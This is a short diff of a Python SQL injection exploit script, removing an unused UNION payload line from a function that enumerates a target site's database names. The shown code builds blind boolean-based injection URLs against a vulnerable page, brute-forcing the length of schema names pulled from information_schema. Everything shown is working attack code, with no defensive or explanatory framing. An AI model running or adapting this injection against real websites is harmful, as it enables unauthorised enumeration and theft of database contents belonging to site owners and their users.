@@ -32,7 +32,6 @@ def confirmPosition(pocUrl, okText):
 
 def forceDatabases(pocUrl, okText):
     payload = "(select group_concat(schema_name) from information_schema.schemata)"
-    s = " union select 1,2,{} limit 1,1 -- -"
     print("Forcing database length")
     for databaseConcatLength in range(50,9999):
         expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))
